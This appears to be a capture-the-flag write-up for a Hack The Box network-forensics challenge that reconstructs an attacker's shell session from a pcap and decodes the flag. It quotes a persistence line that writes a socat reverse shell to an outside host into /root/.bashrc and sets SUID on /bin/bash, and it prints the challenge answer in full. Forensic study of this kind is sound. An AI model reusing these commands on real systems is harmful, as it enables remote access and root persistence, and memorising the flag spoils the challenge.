# WRONG-SPOOKY-SEASON

## FLAG: HTB{j4v4_5pr1ng_just_b3c4m3_j4v4_sp00ky!!}

## Status: Complete

+ DOCKER: NO
+ DOWNLOADABLE: YES

Description: "I told them it was too soon and in the wrong season to deploy such a website, but they assured me that theming it properly would be enough to stop the ghosts from haunting us. I was wrong." Now there is an internal breach in the `Spooky Network` and you need to find out what happened. Analyze the the network traffic and find how the scary ghosts got in and what they did.

## NOTES

1. In the pcap file we see the 'scary ghosts' enable/install socat to portforward and ultimately get RCE with bash (see No. 464 in pcap file)

2. Now analyzing the bash commands in the pcap file (PSH) we see the folowing in chronological order:

    cmd = id
    response = uid=0(root) gid=0(root) groups=0(root)

    cmd = groups
    response = root

    cmd = uname -r
    response = 5.18.0-kali7-amd64

    cmd = cat /etc/passwd
    response =  root:x:0:0:root:/root:/bin/bash
                daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
                bin:x:2:2:bin:/bin:/usr/sbin/nologin
                sys:x:3:3:sys:/dev:/usr/sbin/nologin
                sync:x:4:65534:sync:/bin:/bin/sync
                games:x:5:60:games:/usr/games:/usr/sbin/nologin
                man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
                lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
                mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
                news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
                uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
                proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
                www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
                backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
                list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
                irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
                gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
                nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
                _apt:x:100:65534::/nonexistent:/usr/sbin/nologin
                messagebus:x:101:102::/nonexistent:/usr/sbin/nologin

    cmd = find / -perm -u=s -type f 2>/dev/null
    response =  /bin/su
                /bin/umount
                /bin/mount
                /usr/lib/dbus-1.0/dbus-daemon-launch-helper
                /usr/lib/openssh/ssh-keysign
                /usr/bin/newgrp
                /usr/bin/chfn
                /usr/bin/gpasswd
                /usr/bin/passwd
                /usr/bin/chsh

    cmd = echo 'socat TCP:192.168.1.180:1337 EXEC:sh' > /root/.bashrc && echo "==gC9FSI5tGMwA3cfRjd0o2Xz0GNjNjYfR3c1p2Xn5WMyBXNfRjd0o2eCRFS" | rev > /dev/null && chmod +s /bin/bash

    cmd = ls -lha
    response =  total 20K
                drwxr-xr-x 1 root root 4.0K Oct 10 17:28 .
                drwxr-xr-x 1 root root 4.0K Oct 10 17:28 ..
                -rwxrwx--- 1 root root 1.8K Oct  8 00:04 pom.xml
                drwxr-xr-x 3 root root 4.0K Oct 10 17:27 src
                drwxr-xr-x 1 root root 4.0K Oct 10 17:28 target

3. In here we see the command ran 'echo 'socat TCP:192.168.1.180:1337 EXEC:sh' > /root/.bashrc && echo "==gC9FSI5tGMwA3cfRjd0o2Xz0GNjNjYfR3c1p2Xn5WMyBXNfRjd0o2eCRFS" | rev > /dev/null && chmod +s /bin/bash'

4. Let's reverse the string
5. echo "==gC9FSI5tGMwA3cfRjd0o2Xz0GNjNjYfR3c1p2Xn5WMyBXNfRjd0o2eCRFS" | rev
      1. RESULTS: "SFRCe2o0djRfNXByMW5nX2p1c3RfYjNjNG0zX2o0djRfc3AwMGt5ISF9Cg=="

6. Try and base64 decode that string

7. 'echo "SFRCe2o0djRfNXByMW5nX2p1c3RfYjNjNG0zX2o0djRfc3AwMGt5ISF9Cg==" | base64 -d'
   1. RESULTS: "HTB{j4v4_5pr1ng_just_b3c4m3_j4v4_sp00ky!!}"
